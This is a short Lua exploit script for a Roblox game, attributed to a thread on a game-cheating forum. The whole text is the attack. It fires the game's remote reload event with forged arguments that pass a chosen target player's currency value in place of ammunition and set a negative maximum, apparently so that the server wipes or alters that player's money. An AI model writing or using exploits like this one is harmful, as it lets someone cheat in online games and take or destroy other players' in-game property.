-- ORIGINAL SCRIPT // https://v3rmillion.net/showthread.php?tid=1165198 \\

local target = "target name here"

game.ReplicatedStorage:FindFirstChild(".gg/untitledhood"):FireServer(
   "Reload",
   {
        Name = "[Revolver]",
        Ammo = game:GetService("Players")[target].DataFolder.Currency,
        MaxAmmo = {Value = -69}
   }
)
